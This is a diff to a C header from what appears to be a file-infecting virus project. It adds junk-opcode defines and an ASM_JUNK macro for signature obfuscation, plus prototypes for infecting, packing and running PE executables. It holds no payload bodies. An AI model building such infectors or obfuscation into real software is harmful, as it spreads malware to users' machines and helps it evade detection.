@@ -47,6 +47,26 @@
 # define PATTERN			0x01, 0x03, 0x03, 0x07, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x55
 
 /*
+** ASM instructions :
+*/
+#define PUSH 0x50
+#define POP  0x58
+#define MOV  0xB8
+#define NOP  0x90
+#define ADD  0x01
+#define AND  0x21
+#define XOR  0x31
+#define OR   0x09
+#define SBB  0x19
+#define SUB  0x29
+
+/*
+** .byte PUSH NOP*8 POP
+*/
+#define ASM_JUNK asm __volatile__ (".byte 0x50, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x58");
+#define ASM_JUNK_LEN 8
+
+/*
 ** Data Directories from PE executable :
 */
 #define IMAGE_DIRECTORY_ENTRY_EXPORT    0  // Export Directory
@@ -278,8 +298,9 @@ char							**get_files_types(char **files, char *start_path, bool f(char *file_p
 ** INFECTION
 */
 int								find_pattern(char *file, int len);
-void							infect(char *argv, char *infection_content, int infection_size);
+void							infect(char *argv, char *infection_content, int infection_size, int sequence);
 int								pack_executables(char **result, char *prefix, int prefix_len, char *suffix, int suffix_len);
+bool							run_packed_executable(char *executable_path, char *packed_executable_content, int packed_executable_size, char **argv, char **env);
 /*
 **	MAIN
 */
